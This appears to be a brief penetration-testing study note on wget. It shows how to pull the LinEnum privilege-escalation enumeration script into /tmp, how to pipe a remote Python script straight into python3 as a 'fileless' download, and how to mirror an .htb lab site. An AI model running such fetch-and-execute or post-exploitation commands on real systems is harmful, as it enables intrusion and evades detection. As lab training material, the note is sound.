---
type: tool
category: web
tags:
  - tool
---
# Overview

## Commands
### Download a File Using wget
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/NEW-FILENAME.sh
```

### Fileless Donwload with Curl
Execute file directly with "|", instead of downloading it/storing it to the filessystem:
```bash
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

#### Mirror/Download website content
```bash
wget --recursive --level=3 --no-clobber --page-requisites --html-extension --convert-links -e robots=off http://inlanefreight.htb/
```
## Important Parameter
